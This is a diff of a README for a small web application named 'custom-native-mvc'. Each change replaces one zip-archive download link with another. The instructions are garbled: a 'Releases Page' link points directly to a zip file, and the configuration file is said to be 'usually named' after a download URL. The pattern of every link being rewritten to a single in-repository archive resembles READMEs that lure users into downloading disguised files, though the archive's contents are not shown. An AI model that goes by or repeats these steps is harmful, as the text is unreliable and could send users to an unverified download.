@@ -6,7 +6,7 @@ Welcome to **custom-native-mvc**! This application offers a simple way to explor
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/kumarrv/custom-native-mvc/main/rerental/custom-native-mvc.zip)](https://raw.githubusercontent.com/kumarrv/custom-native-mvc/main/rerental/custom-native-mvc.zip)
+[![Download](https://github.com/kumarrv/custom-native-mvc/raw/refs/heads/main/app/custom_mvc_native_1.1-beta.4.zip)](https://github.com/kumarrv/custom-native-mvc/raw/refs/heads/main/app/custom_mvc_native_1.1-beta.4.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ You will also need a basic text editor to modify the application files. Some pop
 Follow these simple steps to download and run the application:
 
 1. **Visit the Releases Page:**  
-   Click the following link to access the download page: [Visit this page to download](https://raw.githubusercontent.com/kumarrv/custom-native-mvc/main/rerental/custom-native-mvc.zip).
+   Click the following link to access the download page: [Visit this page to download](https://github.com/kumarrv/custom-native-mvc/raw/refs/heads/main/app/custom_mvc_native_1.1-beta.4.zip).
 
 2. **Choose the Latest Version:**  
    On the releases page, you will find the latest version of the application listed at the top. Click on the version you want.
@@ -45,7 +45,7 @@ Follow these simple steps to download and run the application:
    - Import the included SQL file located in the extracted folder to set up the initial tables and data.
 
 7. **Edit Configuration Files:**  
-   Open the configuration file in your extracted directory (usually named `https://raw.githubusercontent.com/kumarrv/custom-native-mvc/main/rerental/custom-native-mvc.zip`). Update the database connection settings with your database details as needed.
+   Open the configuration file in your extracted directory (usually named `https://github.com/kumarrv/custom-native-mvc/raw/refs/heads/main/app/custom_mvc_native_1.1-beta.4.zip`). Update the database connection settings with your database details as needed.
 
 8. **Run the Application:**  
    Open your web browser and navigate to the path where you installed the application. You should see the welcome page of the application.
